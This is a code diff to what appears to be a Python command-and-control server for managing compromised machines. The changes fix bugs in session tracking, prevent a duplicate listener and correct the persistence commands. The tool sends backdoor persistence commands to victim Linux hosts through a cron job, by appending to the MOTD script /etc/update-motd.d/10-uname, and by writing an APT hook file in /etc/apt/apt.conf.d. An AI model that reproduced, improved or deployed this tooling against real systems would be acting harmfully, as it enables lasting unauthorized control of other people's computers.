@@ -120,7 +120,7 @@ def conn_handler():
                 plat_val = 2
             else:
                 plat_val = 0
-            a.append([conn,addr[0]],username,admin_val,plat_val,'Active')
+            a.append([conn,addr[0],username,admin_val,plat_val,'Active'])
         except:
             pass
 
@@ -166,15 +166,15 @@ def target_conn(target_id, a, num):
                 elif a[num][6] == 2:
                     persist_type = input("Enter which type of persistance do you want to use \n 1 for Cronjob\n 2 for MOTD Backdooring(Need to be root) 3 for APT Backdooring(Need to be root)")
                     if persist_type == 1:
-                        persist_command_1 = f'echo "*/5 * * * * python3 /home/{target[num][3]}/{payload}" | crontab -'
+                        persist_command_1 = f'echo "*/5 * * * * python3 /home/{a[num][3]}/{payload}" | crontab -'
                         conn_out(target_id, persist_command_1)
                         print("Enter following command to clean up : \n  crontab -r")
                     elif persist_type == 2:
-                        persist_command_1 = f'echo "python3 /home/target[num][3]/{payload}" >> /etc/update-motd.d/10-uname'
+                        persist_command_1 = f'echo "python3 /home/{a[num][3]}/{payload}" >> /etc/update-motd.d/10-uname'
                         conn_out(target_id, persist_command_1)
                         print(f'Enter following command to clean up : \n  sed -i "/python3/d" /etc/update-motd.d/10-uname')
                     elif persist_type == 3:
-                        persist_command_1 = f'echo "python3 /home/{target[num][0]}/{payload}" >> /etc/apt/apt.conf.d/01persist'
+                        persist_command_1 = f'echo "python3 /home/{a[num][3]}/{payload}" >> /etc/apt/apt.conf.d/01persist'
                         conn_out(target_id, persist_command_1)
                         print(f'Enter following command to clean up : \n  "rm 01persist"')
                     else:
@@ -222,10 +222,14 @@ if __name__=='__main__':
             if command == "help":
                 help()
             if command == "listener -g":
-                host_ip=input("\nEnter the host ip to listen : ")
-                host_port=input("\nEnter host port to listen : ")
-                listener_handler()
-                listener_count += 1
+                if listener_count > 0:
+                    print("You already have a listener handle \n")
+                    continue
+                else:
+                    host_ip=input("\nEnter the host ip to listen : ")
+                    host_port=input("\nEnter host port to listen : ")
+                    listener_handler()
+                    listener_count += 1
             if command == "winclient.py":
                 if listener_count > 0:
                     winclient()
@@ -250,7 +254,7 @@ if __name__=='__main__':
                     table.field_names = ['Session_id', 'Target_ip','Username','Admin','OS', 'Status']
                     table.padding_width = 3
                     for target in a:
-                            table.add_row([str(session_counter),target[1]],target[2],target[3],target[4],target[5])
+                            table.add_row([str(session_counter),target[1],target[2],target[3],target[4],target[5]])
                             session_counter += 1
                     print(table)
                 if command.split(" ")[1] == "-i":
@@ -274,7 +278,7 @@ if __name__=='__main__':
                     print(f"Session {num} not found")
         except KeyboardInterrupt:
             print("\n Keyboard interrupt issued")
-            quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No")
+            quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No : ")
             if quit_msg.lower()=='y':
                 for target in a:
                     if target[5] == "Dead":
